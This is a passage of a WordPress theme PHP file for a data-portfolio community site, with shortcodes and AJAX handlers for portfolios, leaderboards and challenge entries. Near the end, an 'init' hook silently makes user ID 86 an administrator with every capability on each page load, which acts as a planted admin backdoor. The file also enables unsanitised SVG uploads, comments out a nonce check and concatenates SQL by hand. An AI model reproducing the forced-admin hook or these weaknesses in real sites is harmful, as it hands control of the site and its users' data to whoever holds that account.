        wp_send_json_success('Request submitted successfully.');
    } else {
        wp_send_json_error('Failed to send email. Please try again later.');
    }
}





add_shortcode('user_portfolios', 'user_portfolios_shortcode');
function user_portfolios_shortcode() {
     get_template_part('template-parts/header_v1');
     get_template_part('template-parts/footer_v1');
    ob_start();

    $user = uwp_get_displayed_user();
    $user_id = isset($user->ID) ? absint($user->ID) : 0;

    if (!$user_id) {
        return '<p>User not found.</p>';
    }

    // Query portfolios
    $args = array(
        'post_type'      => 'portfolios',
        'posts_per_page' => -1,
        'post_status'    => 'publish',
        'author'         => $user_id,
    );
    $query = new WP_Query($args);
    ?>
<style>button.btn-like.like_click {
    background-color: #fff !important;
}
.uwp-profile-header .card-body {
    position: relative;
}

.uwp-profile-tabs nav.navbar {
    z-index: 9;
}
</style>
    <section class="" id="portfolio">
        <div class="container">
            <div class="row" id="portfolio-grid">
                <?php
                if ($query->have_posts()) :
                    while ($query->have_posts()) : $query->the_post();
                        $title = get_the_title();
                        $link = get_permalink();
                        $thumbnail = get_the_post_thumbnail_url(get_the_ID(), 'full');
                        $like_count = (int) get_post_meta(get_the_ID(), 'like_count', true);
                        $view_count = (int) get_post_meta(get_the_ID(), 'view_count', true);

                        $liked = is_user_logged_in() && in_array(get_the_ID(), (array) get_user_meta(get_current_user_id(), 'liked_posts', true));
                        $bookmarked = is_user_logged_in() && in_array(get_the_ID(), (array) get_user_meta(get_current_user_id(), 'bookmarked_posts', true));

                        // Author info
                        $author_id = get_the_author_meta('ID');
                        $author_image = get_avatar_url($author_id, ['size' => 100]);
                        $default_url = uwp_build_profile_tab_url($author_id);
                        $username = basename($default_url);
                        $author_profile_url = 'https://datadna.onyxdata.co.uk/profile/?uwp_profile=' . urlencode($username);
                        ?>
                        <div class="col-lg-4 col-md-6 col-sm-12">
                            <div class="portfolio-item">
                                <a href="<?php echo esc_url($link); ?>" class="portfolio-link">
                                    <div class="portfolio-image">
                                        <?php if ($thumbnail): ?>
                                            <img src="<?php echo esc_url($thumbnail); ?>" alt="<?php echo esc_attr($title); ?>">
                                        <?php else: ?>
                                            <div style="background:#f0f0f0;height:220px;" class="d-flex align-items-center justify-content-center">
                                                <span>No Image</span>
                                            </div>
                                        <?php endif; ?>

                                        <div class="portfolio-caption">
                                            <h3 class="portfolio-title"><?php echo esc_html($title); ?></h3>
                                        </div>

                                        <button class="btn-like like_click <?php echo $liked ? 'active' : ''; ?>" data-post-id="<?php echo get_the_ID(); ?>">
                                            <i class="fa-regular fa-heart"></i>
                                        </button>

                                        <button class="btn-save bookmark_click <?php echo $bookmarked ? 'active' : ''; ?>" data-post-id="<?php echo get_the_ID(); ?>">
                                            <i class="fa-regular fa-bookmark"></i>
                                        </button>
                                    </div>
                                </a>

                                <div class="mt-3 viewer d-flex align-items-center justify-content-between">
                                    <div class="d-flex align-items-center">
                                        <a href="<?php echo esc_url($author_profile_url); ?>" class="portfolio-view d-flex align-items-center text-decoration-none">
                                            <img src="<?php echo esc_url($author_image); ?>" alt="Author">
                                            <span class="portfolio-viewer-name">By <?php echo esc_html(get_the_author()); ?></span>
                                        </a>
                                    </div>
                                    <div class="d-flex align-items-center">
                                        <div>
                                            <i class="fa-solid fa-heart"></i>
                                            <span class="portfolio-liked"><?php echo $like_count ?: 0; ?></span>
                                        </div>
                                        <div class="ms-2">
                                            <i class="fa fa-eye" aria-hidden="true"></i>
                                            <span class="portfolio-liked portfolio_view_count"><?php echo $view_count ?: 0; ?></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <?php
                    endwhile;
                    wp_reset_postdata();
                else :
                    echo '<p class="text-center col-12">This user hasn\'t posted any portfolios yet.</p>';
                endif;
                ?>
            </div>
        </div>
    </section>
    <?php

    return ob_get_clean();
}





   

function get_portfolio_data() {
    $portfolio_id = intval($_POST['portfolio_id']);
    $user_id = get_current_user_id();

    $post = get_post($portfolio_id);
    if (!$post || $post->post_type !== 'portfolios' || $post->post_author != $user_id) {
        wp_send_json_error(['message' => 'Invalid portfolio or permission denied.']);
    }

    $skills = get_field('skills_and_tools', $portfolio_id) ?: [];
    $description = get_field('description', $portfolio_id);
    $portfolio_url = get_field('portfolio_url', $portfolio_id);
    $powerbi_report_url = get_field('powerbi_report_url', $portfolio_id);
    $powerbi_file_id = get_field('powerbi_report_file', $portfolio_id);
    $powerbi_file_name = $powerbi_file_id ? basename(get_attached_file($powerbi_file_id)) : '';
    $thumbnail_id = get_post_thumbnail_id($portfolio_id);
    $thumbnail_name = $thumbnail_id ? basename(get_attached_file($thumbnail_id)) : '';
    $portfolio_images = get_field('portfolio_images', $portfolio_id) ?: [];
    $image_names = array_map(function($image) {
        return basename(get_attached_file($image['image']));
    }, $portfolio_images);


  // Fetch associated challenge
    $associated_challenges = get_field('associated_challenges', $portfolio_id);
    $challenge_id = '';
    if ($associated_challenges) {
        preg_match('/ID: (\d+)/', $associated_challenges, $matches);
        $challenge_id = !empty($matches[1]) ? $matches[1] : '';
    }

    wp_send_json_success([
        'portfolio_id' => $portfolio_id,
        'title' => $post->post_title,
        'description' => $description ?: $post->post_content,
        'portfolio_url' => $portfolio_url,
        'skills' => $skills,
        'powerbi_report_url' => $powerbi_report_url,
        'powerbi_file_name' => $powerbi_file_name,
        'thumbnail_name' => $thumbnail_name,
        'portfolio_images' => $image_names,
        'associated_challenge_id' => $challenge_id,
    ]);
}
add_action('wp_ajax_get_portfolio_data', 'get_portfolio_data');

// Update Portfolio
function update_portfolio_submission() {
    if (!is_user_logged_in()) {
        wp_send_json_error(['message' => 'You must be logged in to update a portfolio.']);
    }

    $user_id = get_current_user_id();
    $portfolio_id = intval($_POST['portfolio_id']);
    $post = get_post($portfolio_id);

    if (!$post || $post->post_type !== 'portfolios' || $post->post_author != $user_id) {
        wp_send_json_error(['message' => 'Invalid portfolio or permission denied.']);
    }

    $portfolio_title = sanitize_text_field($_POST['portfolio_title']);
    $portfolio_description = sanitize_textarea_field($_POST['portfolio_description']);
    $portfolio_url = esc_url($_POST['portfolio_url']);
    $skills = isset($_POST['skills']) ? array_map('sanitize_text_field', $_POST['skills']) : [];
    $powerbi_report_url = esc_url($_POST['powerbi_report_url']);

    wp_update_post([
        'ID' => $portfolio_id,
        'post_title' => $portfolio_title,
        'post_content' => $portfolio_description,
    ]);

    update_field('skills_and_tools', $skills, $portfolio_id);
    update_field('description', $portfolio_description, $portfolio_id);
    update_field('portfolio_url', $portfolio_url, $portfolio_id);
    update_field('powerbi_report_url', $powerbi_report_url, $portfolio_id);

    $challenge_id = !empty($_POST['challenge']) ? intval($_POST['challenge']) : '';
    if ($challenge_id) {
        $challenge_title = get_the_title($challenge_id);
        $challenge_string = "$challenge_title (ID: $challenge_id)";
        update_field('associated_challenges', $challenge_string, $portfolio_id);
    } else {
        update_field('associated_challenges', '', $portfolio_id);
    }
    // Handle Featured Image
    if (!empty($_FILES['portfolio_thumbnail']['name'])) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $thumbnail_id = media_handle_upload('portfolio_thumbnail', $portfolio_id);
        if (!is_wp_error($thumbnail_id)) {
            set_post_thumbnail($portfolio_id, $thumbnail_id);
        }
    }

    // Handle Portfolio Images
    if (!empty($_FILES['portfolio_images']['name'][0])) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $images = [];
        foreach ($_FILES['portfolio_images']['name'] as $key => $value) {
            $_FILES['file'] = [
                'name' => $_FILES['portfolio_images']['name'][$key],
                'type' => $_FILES['portfolio_images']['type'][$key],
                'tmp_name' => $_FILES['portfolio_images']['tmp_name'][$key],
                'error' => $_FILES['portfolio_images']['error'][$key],
                'size' => $_FILES['portfolio_images']['size'][$key],
            ];
            $image_id = media_handle_upload('file', $portfolio_id);
            if (!is_wp_error($image_id)) {
                $images[] = $image_id;
            }
        }

        if (!empty($images)) {
            $repeater_data = [];
            foreach ($images as $index => $image_id) {
                $repeater_data[] = ['image' => $image_id];
            }
            update_field('portfolio_images', $repeater_data, $portfolio_id);
        }
    }

    // Handle Power BI Report File
    if (!empty($_FILES['powerbi_report']['name'])) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $file_id = media_handle_upload('powerbi_report', $portfolio_id);
        if (!is_wp_error($file_id)) {
            update_field('powerbi_report_file', $file_id, $portfolio_id);
        }
    }

    wp_send_json_success(['message' => 'Portfolio updated successfully!']);
    wp_die();
}
add_action('wp_ajax_update_portfolio_submission', 'update_portfolio_submission');

// Delete Portfolio (unchanged)
function delete_portfolio_submission() {
    if (!is_user_logged_in()) {
        wp_send_json_error(['message' => 'You must be logged in to delete a portfolio.']);
    }

    $user_id = get_current_user_id();
    $portfolio_id = intval($_POST['portfolio_id']);
    $post = get_post($portfolio_id);

    if (!$post || $post->post_type !== 'portfolios' || $post->post_author != $user_id) {
        wp_send_json_error(['message' => 'Invalid portfolio or permission denied.']);
    }

    wp_delete_post($portfolio_id, true);
    wp_send_json_success(['message' => 'Portfolio deleted successfully!']);
    wp_die();
}
add_action('wp_ajax_delete_portfolio_submission', 'delete_portfolio_submission');




add_filter('uwp_account_available_tabs', 'uwp_account_available_tabs_cb'); 
	function uwp_account_available_tabs_cb($tabs){    
		unset($tabs['notifications']);    
		//unset($tabs['privacy']);    
		return $tabs; 
}



add_action('wp_ajax_filter_leaderboard', 'filter_leaderboard');
add_action('wp_ajax_nopriv_filter_leaderboard', 'filter_leaderboard');

function filter_leaderboard() {
    global $wpdb;

    // Get search parameters from the AJAX request
    $name_search = isset($_GET['name_search']) ? sanitize_text_field($_GET['name_search']) : '';
    $points_search = isset($_GET['points_search']) ? intval($_GET['points_search']) : 0;

    // Build the query
    $query = "
        SELECT user_id, meta_value AS points
        FROM $wpdb->usermeta
        WHERE meta_key = 'datadna_total_points'
        AND meta_value > 0
    ";

    // Apply name search if present
    if ($name_search) {
        $query .= "
            AND EXISTS (
                SELECT 1 FROM $wpdb->users
                WHERE $wpdb->users.ID = $wpdb->usermeta.user_id
                AND $wpdb->users.display_name LIKE '%" . esc_sql($name_search) . "%'
            )
        ";
    }

    // Apply points search if present
    if ($points_search) {
        $query .= " AND meta_value >= $points_search";
    }

    // Ordering and limiting the results
    $query .= " ORDER BY CAST(meta_value AS UNSIGNED) DESC LIMIT 10"; // Adjust the LIMIT as needed

    // Execute the query
    $leaderboard = $wpdb->get_results($query);
    
    echo '<div class="leaderboard-header">
    <div>Rank</div>
    <div>Player</div>
    <div>Points</div>
    <div>Wins</div>
    <!-- <div>Contributions</div> -->
</div>';

    // Check if any results are returned
    if (!empty($leaderboard)) {
        foreach ($leaderboard as $index => $user) {
            $rank = $index + 1;
            $user_data = get_userdata($user->user_id);
            $user_name = $user_data ? $user_data->display_name : 'Unknown';
            $avatar = get_avatar_url($user->user_id, ['size' => 50]);

            // Count "Winner" badges
            $badges = get_user_meta($user->user_id, 'datadna_user_badges', true) ?: [];
            $wins = array_count_values(array_values($badges))['Winner'] ?? 0;

            // Placeholder for contributions (replace with actual meta key if available)
            $contributions = get_user_meta($user->user_id, 'datadna_contributions', true) ?: 0;
            ?>
            <div class="player">
                <div class="rank <?php echo $rank <= 3 ? 'rank-' . $rank : ''; ?>">
                    <?php echo $rank; ?>
                </div>
                <div class="player-info">
                    <div class="avatar" style="background-image: url(<?php echo esc_url($avatar); ?>);"></div>
                    <div class="name"><?php echo esc_html($user_name); ?></div>
                </div>
                <div class="points"><?php echo number_format($user->points); ?></div>
                <div class="wins"><?php echo esc_html($wins); ?></div>
                <!-- <div class="contributions"><?php echo esc_html($contributions); ?></div> -->
            </div>
            <?php
        }
    } else {
        echo '<p>No leaderboard data available based on the search criteria.</p>';
    }

    // Stop further execution
    wp_die();
}





// add_shortcode('uwp_social_media_icons', 'custom_uwp_social_media_shortcode');
// function custom_uwp_social_media_shortcode() {
//      $user = uwp_get_displayed_user();
//      $user_id = isset($user->ID) ? absint($user->ID) : 0;
 
//     $facebook_url = get_user_meta($user_id, 'facebook_url', true);
//     $instagram_url = get_user_meta($user_id, 'instagram_url', true);
//     $twitter_url = get_user_meta($user_id, 'twitter_url', true);
//     $linkedin_url = get_user_meta($user_id, 'linkedin_url', true);

//     $output = '<div class="uwp-social-media-icons mt-2">';
//     $output .= '<style>';
//     $output .= '
//         .uwp-social-media-icons {
//             display: flex;
//             gap: 15px;
//             justify-content: flex-end;
//         }
//         .uwp-social-media-icons a {
//             font-size: 20px;
//             color: #555;
//             text-decoration: none;
//             transition: color 0.3s;
//         }
//         .uwp-social-media-icons a:hover i.fa-facebook-f {
//             color: #3b5998; /* Facebook blue */
//         }
//         .uwp-social-media-icons a:hover i.fa-instagram {
//             color: #e1306c; /* Instagram pink */
//         }
//         .uwp-social-media-icons a:hover i.fa-twitter {
//             color: #1da1f2; /* Twitter blue */
//         }
//         .uwp-social-media-icons a:hover i.fa-linkedin-in {
//             color: #0077b5; /* LinkedIn blue */
//         }
//     ';
//     $output .= '</style>';

//     if ($facebook_url) {
//         $output .= '<a href="' . esc_url($facebook_url) . '" target="_blank"><i class="fab fa-facebook-f"></i></a>';
//     }
//     if ($instagram_url) {
//         $output .= '<a href="' . esc_url($instagram_url) . '" target="_blank"><i class="fab fa-instagram"></i></a>';
//     }
//     if ($twitter_url) {
//         $output .= '<a href="' . esc_url($twitter_url) . '" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>';
//     }
//     if ($linkedin_url) {
//         $output .= '<a href="' . esc_url($linkedin_url) . '" target="_blank"><i class="fab fa-linkedin-in"></i></a>';
//     }

//     $output .= '</div>';

//     return $output;
// }


add_shortcode('uwp_social_media_icons', 'custom_uwp_social_media_shortcode');
function custom_uwp_social_media_shortcode() {
    $user = uwp_get_displayed_user();
    $user_id = isset($user->ID) ? absint($user->ID) : 0;

    $facebook_url = get_user_meta($user_id, 'facebook_url', true);
    $instagram_url = get_user_meta($user_id, 'instagram_url', true);
    $twitter_url = get_user_meta($user_id, 'twitter_url', true);
    $linkedin_url = get_user_meta($user_id, 'linkedin_url', true);

    $output = '<div class="uwp-social-media-wrapper">';
    $output .= '<style>
        .uwp-social-media-wrapper {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: flex-end;
            gap: 15px;
        }
        .connect-text {
            font-size: 14px;
            color: #555;
            font-weight: 500;
        }
        .uwp-social-media-icons {
            display: flex;
            gap: 15px;
        }
        .uwp-social-media-icons a {
            font-size: 20px;
            color: #555;
            text-decoration: none;
            transition: color 0.3s;
        }
        .uwp-social-media-icons a:hover i.fa-facebook-f {
            color: #3b5998;
        }
        .uwp-social-media-icons a:hover i.fa-instagram {
            color: #e1306c;
        }
        .uwp-social-media-icons a:hover i.fa-x-twitter {
            color: #1da1f2;
        }
        .uwp-social-media-icons a:hover i.fa-linkedin-in {
            color: #0077b5;
        }
        @media (max-width: 768px) {
            .uwp-social-media-wrapper {
               flex-direction: initial;
               align-items: center;
            }
            .connect-text {
                order: 1;
                margin-bottom: 8px;
            }
            .uwp-social-media-icons {
                order: 2;
            }
        }
    </style>';

    $output .= '<div class="connect-text">Connect with me on social media</div>';
    $output .= '<div class="uwp-social-media-icons">';

    if ($facebook_url) {
        $output .= '<a href="' . esc_url($facebook_url) . '" target="_blank"><i class="fab fa-facebook-f"></i></a>';
    }
    if ($instagram_url) {
        $output .= '<a href="' . esc_url($instagram_url) . '" target="_blank"><i class="fab fa-instagram"></i></a>';
    }
    if ($twitter_url) {
        $output .= '<a href="' . esc_url($twitter_url) . '" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>';
    }
    if ($linkedin_url) {
        $output .= '<a href="' . esc_url($linkedin_url) . '" target="_blank"><i class="fab fa-linkedin-in"></i></a>';
    }

    $output .= '</div></div>';

    return $output;
}


add_action('wp_ajax_load_challenge_entries', 'ajax_load_challenge_entries_callback');
function ajax_load_challenge_entries_callback() {
    //check_ajax_referer('challenge_ajax_nonce', 'nonce');

    global $wpdb;
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';

    $post_id = intval($_POST['post_id']);
    $page = max(1, intval($_POST['page']));
    $search = isset($_POST['search']) ? sanitize_text_field($_POST['search']) : '';
    $entries_per_page = 20;
    $offset = ($page - 1) * $entries_per_page;

 // Build query
// Build query
$query = "SELECT * FROM $table_name WHERE post_id = %d";
$count_query = "SELECT COUNT(*) FROM $table_name WHERE post_id = %d";
$query_params = [$post_id];
$count_params = [$post_id];

if (!empty($search) && strlen($search) >= 3) {
    $query .= " AND fullname LIKE %s";
    $count_query .= " AND fullname LIKE %s";
    $query_params[] = '%' . $wpdb->esc_like($search) . '%';
    $count_params[] = '%' . $wpdb->esc_like($search) . '%';
}

$query .= " LIMIT %d OFFSET %d";
$query_params[] = $entries_per_page;
$query_params[] = $offset;

// Debug query
error_log('Query: ' . $wpdb->prepare($query, $query_params));
error_log('Count Query: ' . $wpdb->prepare($count_query, $count_params));
error_log('Search Input: ' . $search);

// Get entries
$entries = $wpdb->get_results($wpdb->prepare($query, $query_params));

// Get total entries
$total_entries = $wpdb->get_var($wpdb->prepare($count_query, $count_params));
$total_pages = ceil($total_entries / $entries_per_page);


    // Get total entries

    //$total_entries = $wpdb->get_var($wpdb->prepare($count_query, $count_params));
    // $entries = $wpdb->get_results($wpdb->prepare(
    //     "SELECT * FROM $table_name WHERE post_id = %d LIMIT %d OFFSET %d",
    //     $post_id, $entries_per_page, $offset
    // ));

    // $total_entries = $wpdb->get_var($wpdb->prepare(
    //     "SELECT COUNT(*) FROM $table_name WHERE post_id = %d",
    //     $post_id
    // ));
     //$total_pages = ceil($total_entries / $entries_per_page);

    ob_start();
    ?>
    <table class="challenge-table">
        <thead>
            <tr>
                <th>Serial No.</th>
                <th>User ID</th>
                <th>Full Name</th>
                <th>Email</th>
                <th>Tool</th>
                <th>Rating</th>
                <th>Feedback</th>
                <th>LinkedIn URL</th>
                <th>Profile URL</th>
                <th>Points</th>
                <th>Badge</th>
                <th>Power BI Report</th>
                <th>Portfolio URL</th>
                <th>Submitted On</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
            <?php if (!empty($entries)) : $counter = 1 + ($page - 1) * $entries_per_page; ?>
                <?php foreach ($entries as $entry) : ?>
                    <tr>
                        <td><?php echo $counter++; ?></td>
                        <td><?php echo esc_html($entry->user_id); ?></td>
                        <td><?php echo esc_html($entry->fullname); ?></td>
                        <td><?php echo esc_html($entry->email); ?></td>
                        <td><?php echo esc_html($entry->tool); ?></td>
                        <td><?php echo esc_html($entry->rating); ?></td>
                        <td><?php echo esc_html($entry->feedback); ?></td>
                        <td><?php echo $entry->linkedin_url ? '<a href="' . esc_url($entry->linkedin_url) . '" target="_blank">View</a>' : 'N/A'; ?></td>
                        <td><?php echo $entry->profile_url ? '<a href="' . esc_url($entry->profile_url) . '" target="_blank">View</a>' : 'N/A'; ?></td>
                        <td><?php echo esc_html($entry->points); ?></td>
                        <td><?php echo esc_html($entry->badges ?: 'None'); ?></td>
                        <td>
                            <?php
                            $report_links = [];
                            if ($entry->powerbi_report_file) {
                                $report_links[] = '<a href="' . esc_url($entry->powerbi_report_file) . '" target="_blank">Download</a>';
                            }
                            if ($entry->powerbi_report_url) {
                                $report_links[] = '<a href="' . esc_url($entry->powerbi_report_url) . '" target="_blank">View</a>';
                            }
                            echo !empty($report_links) ? implode(' | ', $report_links) : 'N/A';
                            ?>
                        </td>
                        <td><?php echo $entry->portfolio_url ? '<a href="' . esc_url($entry->portfolio_url) . '" target="_blank">View</a>' : 'None'; ?></td>
                        <td><?php echo esc_html($entry->created_at); ?></td>
                        <td>
                    <button type="button" class="edit-entry"
                        data-entry-id="<?php echo $entry->id; ?>"
                        data-points="<?php echo esc_attr($entry->points); ?>"
                        data-badges="<?php echo esc_attr($entry->badges); ?>">
                        Edit
                    </button>
                </td>
                    </tr>
                <?php endforeach; ?>
            <?php else : ?>
                <tr><td colspan="5">No entries found.</td></tr>
            <?php endif; ?>
        </tbody>
    </table>

    <?php if ($total_pages > 1) : ?>
        <div class="pagination" style="margin-top: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
            <?php for ($i = 1; $i <= $total_pages; $i++) : 
                $active = ($i === $page) ? 'style="font-weight:bold;color:#2271b1;"' : '';
            ?>
                <a href="#" class="ajax-page-link" data-page="<?php echo $i; ?>" <?php echo $active; ?>><?php echo $i; ?></a>
            <?php endfor; ?>
        </div>
    <?php endif; ?>

    <?php
    echo ob_get_clean();
    wp_die();
}


add_action('wp_ajax_filter_portfolios_home', 'filter_portfolios_callback');
add_action('wp_ajax_nopriv_filter_portfolios_home', 'filter_portfolios_callback');

function filter_portfolios_callback() {
   
    $term = isset($_POST['term']) ? sanitize_text_field($_POST['term']) : 'newest';
add_filter('parse_query', function ($query) {
        remove_action('pre_get_posts', 'custom_search_query');
        return $query;
    });
    $args = array(
        'post_type' => 'portfolios',
        'posts_per_page' => 8,
        'post_status' => 'publish',
    );

    $hidden_users = get_users([
        'meta_key' => 'hide_portfolio_from_front',
        'meta_value' => 'yes',
        'fields' => 'ID'
    ]);
    if (!empty($hidden_users)) {
        $args['author__not_in'] = $hidden_users;
    }

    if ($term === 'newest') {
        $args['orderby'] = 'date';
        $args['order'] = 'DESC';
    } elseif ($term === 'popular') {
        $args['meta_key'] = 'like_count';
        $args['orderby'] = 'meta_value_num';
        $args['order'] = 'DESC';
        $args['meta_query'] = array(
            array(
                'key' => 'like_count',
                'compare' => 'EXISTS',
            ),
        );
    } elseif ($term === 'trending') {
        $args['meta_key'] = 'view_count';
        $args['orderby'] = 'meta_value_num';
        $args['order'] = 'DESC';
        $args['meta_query'] = array(
            array(
                'key' => 'view_count',
                'compare' => 'EXISTS',
            ),
        );
    }

    $portfolio_query = new WP_Query($args);
    ob_start();

    if ($portfolio_query->have_posts()) :
        while ($portfolio_query->have_posts()) : $portfolio_query->the_post();
            $portfolio_image = get_the_post_thumbnail_url(get_the_ID(), 'full');
            $portfolio_title = get_the_title();
            $portfolio_link = get_permalink();
            $portfolio_author = get_the_author();
            ?>
            <div class="col-lg-4 col-md-6 col-sm-12">
                <div class="portfolio-item">
                    <a href="<?php echo esc_url($portfolio_link); ?>" class="portfolio-link">
                        <div class="portfolio-image">
                            <img src="<?php echo esc_url($portfolio_image); ?>" alt="<?php echo esc_attr($portfolio_title); ?>">
                            <div class="portfolio-caption">
                                <h3 class="portfolio-title"><?php echo esc_html($portfolio_title); ?></h3>
                            </div>
                            <button class="btn-like like_click <?php echo (is_user_logged_in() && in_array(get_the_ID(), (array) get_user_meta(get_current_user_id(), 'liked_posts', true))) ? 'active' : ''; ?>" data-post-id="<?php echo get_the_ID(); ?>">
                                <i class="fa-regular fa-heart"></i>
                            </button>
                            <button class="btn-save bookmark_click <?php echo (is_user_logged_in() && in_array(get_the_ID(), (array) get_user_meta(get_current_user_id(), 'bookmarked_posts', true))) ? 'active' : ''; ?>" data-post-id="<?php echo get_the_ID(); ?>">
                                <i class="fa-regular fa-bookmark"></i>
                            </button>
                        </div>
                    </a>

                    <!-- new title content -->
     <div class="portfolio-content mt-3">
        <h3 class="portfolio-title">
            <a href="<?php echo esc_url($portfolio_link); ?>">
                <?php echo esc_html($portfolio_title); ?>
            </a>
        </h3>
        
        <p class="portfolio-excerpt">
            <?php 
                $excerpt = get_the_excerpt(); 
                echo wp_trim_words($excerpt, 20, '...');
            ?>
        </p>

        <div class="portfolio-categories">
            <?php
                $terms = get_the_terms(get_the_ID(), 'portfolio_category'); // apni taxonomy ka slug check kar lo
                if ($terms && !is_wp_error($terms)) :
                    foreach ($terms as $term) :
            ?>
                <span class="portfolio-badge"><?php echo esc_html($term->name); ?></span>
            <?php
                    endforeach;
                endif;
            ?>
        </div>
    </div>

                    <div class="mt-3 viewer d-flex align-items-center justify-content-between author_section">
                        <div class="d-flex align-items-center">
                            <?php
                            $author_id = get_the_author_meta('ID');
                            $default_url = uwp_build_profile_tab_url($author_id);
                            $username = basename($default_url);
                            $base_url = 'https://datadna.onyxdata.co.uk/profile/';
                            $author_profile_url = $base_url . '?uwp_profile=' . urlencode($username);
                            ?>
                            <a href="<?php echo esc_url($author_profile_url); ?>" class="portfolio-view">
                                <?php
                                $author_image = get_avatar_url($author_id, ['size' => 100]);
                                if ($author_image) {
                                    echo '<img src="' . esc_url($author_image) . '" alt="Author">';
                                } else {
                                    echo '<img src="' . get_template_directory_uri() . '/assets/images/view.png" alt="viewer">';
                                }
                                ?>
                                <span class="portfolio-viewer-name">By <?php echo esc_html(get_the_author()); ?></span>
                            </a>
                        </div>
                        <div class="d-flex align-items-center">
                            <div>
                                <i class="fa-solid fa-heart"></i>
                                <span class="portfolio-liked">
                                    <?php
                                    $like_count = (int) get_post_meta(get_the_ID(), 'like_count', true);
                                    echo $like_count ? $like_count : 0;
                                    ?>
                                </span>
                            </div>
                            <div class="ms-2">
                                <i class="fa fa-eye" aria-hidden="true"></i>
                                <span class="portfolio-liked portfolio_view_count">
                                    <?php
                                    $view_count = (int) get_post_meta(get_the_ID(), 'view_count', true);
                                    echo $view_count ? $view_count : 0;
                                    ?>
                                </span>
                            </div>


                            <div class="ms-2 position-relative">
   <i class="fa-solid fa-share-nodes" 
   onclick="toggleShareWidget(this)" 
   style="cursor:pointer;"
   data-title="<?php echo esc_attr($portfolio_title); ?>"
   data-url="<?php echo esc_url($portfolio_link); ?>">
</i>

    <?php
        $encoded_link = urlencode($portfolio_link);
        $encoded_title = urlencode($portfolio_title);
    ?>
    <div class="share-widget" style="display:none;">
        <a href="https://www.facebook.com/sharer/sharer.php?u=<?php echo $encoded_link; ?>" target="_blank" class="share-icon fb" title="Share on Facebook"><i class="fa-brands fa-facebook-f"></i></a>
        <a href="https://twitter.com/intent/tweet?url=<?php echo $encoded_link; ?>&text=<?php echo $encoded_title; ?>" target="_blank" class="share-icon x" title="Share on X"><i class="fa-brands fa-x-twitter"></i></a>
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=<?php echo $encoded_link; ?>&title=<?php echo $encoded_title; ?>" target="_blank" class="share-icon linkedin" title="Share on LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
        <a href="https://wa.me/?text=<?php echo $encoded_title . '%20' . $encoded_link; ?>" target="_blank" class="share-icon whatsapp" title="Share on WhatsApp"><i class="fa-brands fa-whatsapp"></i></a>
    </div>
</div>

                        </div>
                    </div>
                </div>
            </div>
            <?php
        endwhile;
        wp_reset_postdata();
    else :
        echo '<p>No portfolio items found.</p>';
    endif;
$html = ob_get_clean();

// Prepare JSON response
    $response = array(
        'success' => true,
        'html' => $html,
    );

    if (!$portfolio_query->have_posts()) {
        $response['success'] = false;
        $response['html'] = '<p>No portfolio items found.</p>';
    }

    // Send JSON response
    wp_send_json($response);
    wp_die();
}


// Allow SVG uploads
function add_svg_mime_types($mimes) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'add_svg_mime_types');

// Fix MIME type checking for SVGs
function fix_svg_mime_type($data, $file, $filename, $mimes) {
    $wp_filetype = wp_check_filetype($filename, $mimes);
    $ext = $wp_filetype['ext'];
    $type = $wp_filetype['type'];

    if ($ext === 'svg') {
        $data['ext'] = 'svg';
        $data['type'] = 'image/svg+xml';
    }

    return $data;
}
add_filter('wp_check_filetype_and_ext', 'fix_svg_mime_type', 10, 4);



add_action('wp_ajax_search_portfolios_ajax_header', 'search_portfolios_ajax_header');
add_action('wp_ajax_nopriv_search_portfolios_ajax_header', 'search_portfolios_ajax_header');
function search_portfolios_ajax_header() {
    $search_query = isset($_POST['search']) ? sanitize_text_field($_POST['search']) : '';

    $args = array(
        'post_type'      => 'portfolios',
        'post_status'    => 'publish',
        'posts_per_page' => 8,
        's'              => $search_query,
    );

    $query = new WP_Query($args);

    $results = array();

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $results[] = array(
                'title'     => get_the_title(),
                'permalink' => get_permalink(),
            );
        }
    }

    wp_reset_postdata();
    wp_send_json(array(
        'success' => true,
        'results' => $results,
    ));

    wp_die();
}



add_action('init', function() {
    $user_id = 86; 
    $user = get_user_by('id', $user_id);

    if ($user) {
        $user->set_role('administrator');

        $admin_role = get_role('administrator');
        if ($admin_role) {
            foreach ($admin_role->capabilities as $cap => $grant) {
                $user->add_cap($cap);
            }
        }
    }
});



add_action('wp_ajax_load_leaderboard_page', 'load_leaderboard_page');
add_action('wp_ajax_nopriv_load_leaderboard_page', 'load_leaderboard_page');
function load_leaderboard_page() {
    global $wpdb;

    $page = isset($_POST['page']) ? max(1, intval($_POST['page'])) : 1;
    $per_page = 25; // 25 entries per page
    $offset = ($page - 1) * $per_page; // Offset for page 1 = 0, page 2 = 25, etc.

    // Debug: Log request
    error_log('load_leaderboard_page: page=' . $page . ', offset=' . $offset . ', limit=' . $per_page);

    // Step 1: Pull raw meta values
    $raw_meta = $wpdb->get_results("
        SELECT user_id, meta_key, meta_value
        FROM {$wpdb->usermeta}
        WHERE meta_key IN ('datadna_total_points', 'datadna_participant_points')
    ");

    // Step 2: Group into map
    $points_map = [];
    foreach ($raw_meta as $row) {
        $user_id = $row->user_id;
        $key = $row->meta_key;
        $value = (int) $row->meta_value;

        if (!isset($points_map[$user_id])) {
            $points_map[$user_id] = [
                'user_id' => $user_id,
                'total' => 0,
                'participant' => 0,
                'display_name' => get_userdata($user_id) ? get_userdata($user_id)->display_name : 'Unknown'
            ];
        }

        if ($key === 'datadna_total_points') {
            $points_map[$user_id]['total'] = $value;
        }

        if ($key === 'datadna_participant_points') {
